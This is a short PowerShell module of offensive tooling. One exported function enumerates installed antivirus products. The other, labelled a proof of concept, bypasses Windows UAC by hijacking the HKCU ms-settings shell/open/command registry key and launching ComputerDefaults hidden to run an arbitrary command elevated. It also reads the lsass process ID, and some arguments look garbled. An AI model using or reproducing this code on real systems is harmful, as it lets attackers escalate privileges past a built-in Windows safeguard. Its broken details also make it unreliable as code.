function checkavs {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
}
Export-ModuleMember -Function checkavs
Set-Alias -Name checkavs -Value checkavs -Description "Check Antivirus Products"
#POC for Windows (over exe file)
function up {
    param(
		[string]$processName
    )
    $Request =  $processName
cmd /c reg add "HKCU\software\classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "$Request" /f
clear;sleep(10.0)
cmd /c powershell -Command "New-ItemProperty -Path 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force |OUT-NULL";clear
$ProgressPreference="SilentlyContinue";$IDPORT = (get-process lsass).Id;ComputerDefaults -PID '$IDPORT' -File '$Request' -windowstyle hidden
clear
}
Export-ModuleMember -Function up
Set-Alias -Name up -Value up
